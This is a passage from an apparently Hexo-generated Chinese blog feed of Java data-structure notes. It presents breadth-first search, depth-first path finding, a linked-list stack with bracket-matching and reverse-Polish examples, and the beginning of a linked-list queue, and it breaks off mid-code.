<h2 id="2-广度优先搜索"><a href="#2-广度优先搜索" class="headerlink" title="2. 广度优先搜索"></a>2. 广度优先搜索</h2><p>所谓的深度优先搜索，指的是在搜索时，如果遇到一个结点既有子结点，又有兄弟结点，那么先找兄弟结点，然后找子结点。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141752.png" alt="  "></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141754.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BreadthFirstSearch</span> &#123;</span><br><span class="line">    <span class="comment">// 索引代表顶点，值表示当前顶点是否已经被搜索</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span>[] marked;</span><br><span class="line">    <span class="comment">// 记录有多少个顶点与s顶点相通</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="comment">// 用来存储待搜索邻接表的点</span></span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;Integer&gt; waitSearch;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造广度优先搜索对象，使用广度优先搜索找出 G 图中 s 顶点的所有相邻顶点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BreadthFirstSearch</span><span class="params">(Graph G, <span class="type">int</span> s)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.marked = <span class="keyword">new</span> <span class="title class_">boolean</span>[G.V()];</span><br><span class="line">        <span class="built_in">this</span>.count = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.waitSearch = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line">        bfs(G,s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用广度优先搜索找出G图中v顶点的所有相邻顶点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">bfs</span><span class="params">(Graph G, <span class="type">int</span> v)</span> &#123;</span><br><span class="line">		<span class="comment">// 把当前顶点v标识为已搜索</span></span><br><span class="line">		marked[v] = <span class="literal">true</span>;</span><br><span class="line">		<span class="comment">// 让顶点 v 的相邻点都进入队列</span></span><br><span class="line">		waitSearch.addAll(G.adj(v));</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 通过循环，如果队列不为空，则从队列中弹出一个待搜索的顶点进行搜索</span></span><br><span class="line">		<span class="keyword">while</span>(!waitSearch.isEmpty())&#123;</span><br><span class="line">			<span class="comment">// 弹出一个待搜索的顶点</span></span><br><span class="line">			<span class="type">Integer</span> <span class="variable">wait</span> <span class="operator">=</span> waitSearch.poll();</span><br><span class="line">			<span class="keyword">if</span> (!marked[wait])&#123;</span><br><span class="line">				 bfs(G, wait);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 让相通的顶点+1；</span></span><br><span class="line">		count++;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断w顶点与s顶点是否相通</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">marked</span><span class="params">(<span class="type">int</span> w)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> marked[w];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取与顶点s相通的所有顶点的总数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">count</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="五、路径查找"><a href="#五、路径查找" class="headerlink" title="五、路径查找"></a>五、路径查找</h1><p>在实际生活中，地图是我们经常使用的一种工具，通常我们会用它进行导航，输入一个出发城市，输入一个目的地城市，就可以把路线规划好，而在规划好的这个路线上，会路过很多中间的城市。这类问题翻译成专业问题就是：从s顶点到v顶点是否存在一条路径？如果存在，请找出这条路径。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141757.png" alt="  "><br>例如在上图上查找顶点0到顶点4的路径用红色标识出来,那么我们可以把该路径表示为 0-2-3-4。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141759.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DepthFirstPaths</span> &#123;</span><br><span class="line">    <span class="comment">// 索引代表顶点，值表示当前顶点是否已经被搜索</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span>[] marked;</span><br><span class="line">    <span class="comment">// 起点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> s;</span><br><span class="line">    <span class="comment">// 索引代表顶点，值代表从起点s到当前顶点路径上的最后一个顶点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] edgeTo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造深度优先搜索对象，使用深度优先搜索找出G图中起点为s的所有路径</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DepthFirstPaths</span><span class="params">(Graph G, <span class="type">int</span> s)</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化marked数组</span></span><br><span class="line">        <span class="built_in">this</span>.marked = <span class="keyword">new</span> <span class="title class_">boolean</span>[G.V()];</span><br><span class="line">        <span class="comment">// 初始化起点</span></span><br><span class="line">        <span class="built_in">this</span>.s = s;</span><br><span class="line">        <span class="comment">// 初始化edgeTo数组</span></span><br><span class="line">        <span class="built_in">this</span>.edgeTo = <span class="keyword">new</span> <span class="title class_">int</span>[G.V()];</span><br><span class="line">        dfs(G,s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用深度优先搜索找出 G 图中 v 顶点的所有相邻顶点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(Graph G, <span class="type">int</span> v)</span>&#123;</span><br><span class="line">        <span class="comment">// 把v表示为已搜索</span></span><br><span class="line">        marked[v] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 遍历顶点v的邻接表，拿到每一个相邻的顶点，继续递归搜索</span></span><br><span class="line">        <span class="keyword">for</span> (Integer w : G.adj(v)) &#123;</span><br><span class="line">            <span class="comment">// 如果顶点w没有被搜索，则继续递归搜索</span></span><br><span class="line">            <span class="keyword">if</span> (!marked[w])&#123;</span><br><span class="line">                edgeTo[w] = v;<span class="comment">//到达顶点w的路径上的最后一个顶点是v</span></span><br><span class="line">                dfs(G,w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断w顶点与s顶点是否存在路径</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathTo</span><span class="params">(<span class="type">int</span> v)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> marked[v];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找出从起点s到顶点v的路径(就是该路径经过的顶点)</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">pathTo</span><span class="params">(<span class="type">int</span> v)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!hasPathTo(v))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建对象，保存路径中的所有顶点</span></span><br><span class="line">        ArrayList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 通过循环，从顶点v开始，一直往前找，到找到起点为止</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> v; x != s; x = edgeTo[x])&#123;</span><br><span class="line">            path.add(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 把起点s放到栈中</span></span><br><span class="line">        path.add(s);</span><br><span class="line">        Collections.reverse(path);</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数据结构-栈与队列</title>
    <url>/posts/4906c062.html</url>
    <content><![CDATA[<h1 id="一、栈"><a href="#一、栈" class="headerlink" title="一、栈"></a>一、栈</h1><p>栈是一种基于先进后出(FILO)的数据结构，是一种只能在一端进行插入和删除操作的特殊线性表。它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据(最后一个数据被第一个读出来)。<br>我们称数据进入到栈的动作压栈，数据从栈中出去的动作为弹栈。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142810.png" alt="  "></p>
<h2 id="1-栈实现"><a href="#1-栈实现" class="headerlink" title="1. 栈实现"></a>1. 栈实现</h2><p>实现栈，可以基于数组，也可以基于链表，在此处，我以链表的方式实现栈，在入栈时，使用的头插法。</p>
<p><strong>栈的API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142837.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stack</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Iterable</span>&lt;T&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录首结点</span></span><br><span class="line">    <span class="keyword">private</span> Node head;</span><br><span class="line">    <span class="comment">// 栈中元素的个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> T item;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node next)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.item = item;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stack</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.head = <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断当前栈中元素个数是否为 0</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取栈中元素的个数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把 t 元素压入栈，使用头插法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t)</span>&#123;</span><br><span class="line">        <span class="comment">// 创建新结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(t, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 让新结点指向原来的第一个结点</span></span><br><span class="line">        newNode.next = head.next;</span><br><span class="line">        <span class="comment">// 让首结点指向新结点</span></span><br><span class="line">        head.next = newNode;</span><br><span class="line">        <span class="comment">// 元素个数+1；</span></span><br><span class="line">        N ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 弹出栈顶元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 找到首结点指向的第一个结点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">oldFirst</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="keyword">if</span> (oldFirst == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 让首结点指向原来第一个结点的下一个结点</span></span><br><span class="line">        head.next = oldFirst.next;</span><br><span class="line">        <span class="comment">// 元素个数-1</span></span><br><span class="line">        N --;</span><br><span class="line">        <span class="keyword">return</span> oldFirst.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;T&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyIterator</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MyIteratorimplements</span> Iterator&#123;</span><br><span class="line">        <span class="keyword">private</span> Node node;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">MyIterator</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.node = head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> node.next != <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">            <span class="keyword">return</span> node.item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-关于栈的问题"><a href="#2-关于栈的问题" class="headerlink" title="2. 关于栈的问题"></a>2. 关于栈的问题</h2><h3 id="①-括号匹配问题"><a href="#①-括号匹配问题" class="headerlink" title="① 括号匹配问题"></a>① 括号匹配问题</h3><p><strong>问题描述：</strong></p>
<p>给定一个字符串，里面可能包含”()”小括号和其他字符，请编写程序检查该字符串的中的小括号是否成对出现<br>例如：<br>    “(上海)(长安)”：正确匹配<br>    “上海((长安))”：正确匹配<br>    “上海(长安)(北京)(深圳)(南京)”：正确匹配<br>    “上海(长安))”：错误匹配<br>    “((上海)长安”：错误匹配</p>
<blockquote>
<p><strong>分析：</strong></p>
<ol>
<li>创建一个栈用来存储左括号</li>
<li>从左往右遍历字符串，拿到每一个字符</li>
<li>判断该字符是不是左括号，如果是，存入栈中</li>
<li>判断该字符串是不是右括号，如果不是，继续下一次循环</li>
<li>如果该字符是右括号，则从栈中弹出一个元素t</li>
<li>判断元素t是否是null，如果不是，则证明有对相应的左括号，如果不是，则证明没有对应的左括号</li>
<li>循环结束后，判断栈中有没有剩余的左括号，如果有，则不匹配，如果没有，则匹配</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tyt.linear.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BracketsMatchTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;上海(长安)()&quot;</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">match</span> <span class="operator">=</span> isMatch(str);</span><br><span class="line">        System.out.println(str + <span class="string">&quot;中的括号是否匹配：&quot;</span> + match);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断 str 中的括号是否匹配</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> str 括号组成的字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果匹配，返回true，如果不匹配，返回false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String str)</span>&#123;</span><br><span class="line">        <span class="comment">// 创建栈对象，用来存储左括号</span></span><br><span class="line">        Stack&lt;String&gt; charStack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 从左往右遍历字符串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">currChar</span> <span class="operator">=</span> str.charAt(i)+ <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">// 当前字符为左括号，放入到栈中</span></span><br><span class="line">            <span class="keyword">if</span> (currChar.equals(<span class="string">&quot;(&quot;</span>))&#123;</span><br><span class="line">                charStack.push(currChar);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(currChar.equals(<span class="string">&quot;)&quot;</span>))&#123;</span><br><span class="line">                <span class="comment">// 当前字符是右括号，从栈中弹出一个左括号，并判断弹出的结果是否为null,</span></span><br><span class="line">                <span class="comment">// 如果为null证明没有匹配的左括号，如果不为null，则证明有匹配的左括号</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">pop</span> <span class="operator">=</span> charStack.pop();</span><br><span class="line">                <span class="keyword">if</span> (pop == <span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断栈中还有没有剩余的左括号，如果有，则证明括号不匹配</span></span><br><span class="line">        <span class="keyword">return</span> charStack.size() == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="②-逆波兰表达式求值问题"><a href="#②-逆波兰表达式求值问题" class="headerlink" title="② 逆波兰表达式求值问题"></a>② 逆波兰表达式求值问题</h3><p>逆波兰表达式求值问题是我们计算机中经常遇到的一类问题，要研究明白这个问题，首先我们得搞清楚什么是逆波兰表达式？要搞清楚逆波兰表达式，我们得从中缀表达式说起<br><strong>中缀表达式：</strong><br>中缀表达式就是我们平常生活中使用的表达式，例如：1+3*2,2-(1+3)等等，中缀表达式的特点是：二元运算符总是置于两个操作数中间。<br>中缀表达式是人们最喜欢的表达式，但是对于计算机而言，中缀表达式的运算顺序不具有规律性。不同的运算符具有不同的优先级。如果计算机执行中缀表达式，需要解析表达式语义，做大量的优先级相关操作。<br><strong>逆波兰表达式(后缀表达式)：</strong><br>逆波兰表达式是波兰逻辑学家与1929年首先提出的一种表达式的表示方法，后缀表达式的特点：运算符总是放在跟他相关的操作数之后。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142842.png" alt="  "></p>
<blockquote>
<p><strong>解题思路：</strong></p>
<ol>
<li>创建一个栈对象oprands存储操作数 </li>
<li>从左往右遍历逆波兰表达式，得到每一个字符串 </li>
<li>判断该字符串是不是运算符，如果不是，把该该操作数压入oprands栈中 </li>
<li>如果是运算符，则从oprands栈中弹出两个操作数o1,o2 </li>
<li>使用该运算符计算o1和o2，得到结果result </li>
<li>把该结果压入oprands栈中 </li>
<li>遍历结束后，拿出栈中最终的结果返回</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tyt.linear.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReversePolishNotationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 中缀表达式 3 *（17-15）+18/6 的逆波兰表达式如下 6 + 3 = 9</span></span><br><span class="line">        String[] notation = &#123;<span class="string">&quot;3&quot;</span>, <span class="string">&quot;17&quot;</span>, <span class="string">&quot;15&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;18&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> caculate(notation);</span><br><span class="line">        System.out.println(<span class="string">&quot;逆波兰表达式的结果为：&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> notaion 逆波兰表达式的数组表示方式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 逆波兰表达式的计算结果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">caculate</span><span class="params">(String[] notaion)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个栈，用来存储操作数</span></span><br><span class="line">        Stack&lt;Integer&gt; oprands = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 从左往右遍历逆波兰表达式，得到每一个元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; notaion.length; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">curr</span> <span class="operator">=</span> notaion[i];</span><br><span class="line">            <span class="comment">// 判断当前元素是运算符还是操作数</span></span><br><span class="line">            Integer o1;</span><br><span class="line">            Integer o2;</span><br><span class="line">            Integer result;</span><br><span class="line">            <span class="keyword">switch</span> (curr) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;+&quot;</span>:</span><br><span class="line">                    <span class="comment">// 运算符 + ，从栈中弹出两个操作数，完成 + 运算，运算完的结果再压入栈中</span></span><br><span class="line">                    o1 = oprands.pop();</span><br><span class="line">                    o2 = oprands.pop();</span><br><span class="line">                    result = o2 + o1;</span><br><span class="line">                    oprands.push(result);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;-&quot;</span>:</span><br><span class="line">                    <span class="comment">// 运算符 - ，从栈中弹出两个操作数，完成运 - 算，运算完的结果再压入栈中</span></span><br><span class="line">                    o1 = oprands.pop();</span><br><span class="line">                    o2 = oprands.pop();</span><br><span class="line">                    result = o2 - o1;</span><br><span class="line">                    oprands.push(result);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                    <span class="comment">// 运算符 * ，从栈中弹出两个操作数，完成 * 运算，运算完的结果再压入栈中</span></span><br><span class="line">                    o1 = oprands.pop();</span><br><span class="line">                    o2 = oprands.pop();</span><br><span class="line">                    result = o2 * o1;</span><br><span class="line">                    oprands.push(result);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;/&quot;</span>:</span><br><span class="line">                    <span class="comment">// 运算符 / ，从栈中弹出两个操作数，完成 / 运算，运算完的结果再压入栈中</span></span><br><span class="line">                    o1 = oprands.pop();</span><br><span class="line">                    o2 = oprands.pop();</span><br><span class="line">                    result = o2 / o1;</span><br><span class="line">                    oprands.push(result);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="comment">// 操作数，把该操作数放入到栈中；</span></span><br><span class="line">                    oprands.push(Integer.parseInt(curr));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 得到栈中最后一个元素，就是逆波兰表达式的结果</span></span><br><span class="line">        <span class="keyword">return</span> oprands.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="二、队列"><a href="#二、队列" class="headerlink" title="二、队列"></a>二、队列</h1><p>队列是一种基于先进先出(FIFO)的数据结构，是一种只能在一端进行插入,在另一端进行删除操作的特殊线性表，它按照先进先出的原则存储数据，先进入的数据，在读取数据时先读被读出来。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142848.png" alt="  "></p>
<h2 id="1-队列实现"><a href="#1-队列实现" class="headerlink" title="1. 队列实现"></a>1. 队列实现</h2><p>同栈相同，实现队列，可以基于数组，也可以基于链表，在此处，我仍然以链表的方式实现队列，与实现栈不同的是，在此处插入时我使用的是尾插法。</p>
<p><strong>队列的API设计</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142851.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Queue</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Iterable</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="comment">// 记录首结点</span></span><br><span class="line">    <span class="keyword">private</span> Node head;</span><br><span class="line">    <span class="comment">// 记录最后一个结点</span></span><br><span class="line">    <span class="keyword">private</span> Node last;</span><br><span class="line">    <span class="comment">// 记录队列中元素的个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> T item;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T item, Node next)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.item = item;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Queue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.head = <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="built_in">this</span>.last = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断队列是否为空</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回队列中元素的个数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向队列中插入元素t</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">enqueue</span><span class="params">(T t)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (last == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 尾结点 last 为 null</span></span><br><span class="line">            last= <span class="keyword">new</span> <span class="title class_">Node</span>(t,<span class="literal">null</span>);</span><br><span class="line">            head.next = last;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 当前尾结点 last 不为 null</span></span><br><span class="line">            <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(t, <span class="literal">null</span>);</span><br><span class="line">            last.next = newNode;</span><br><span class="line">            last = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 元素个数+1</span></span><br><span class="line">        N ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从队列中拿出一个元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">dequeue</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">oldFirst</span> <span class="operator">=</span> head.next;</span><br><span class="line">        head.next = 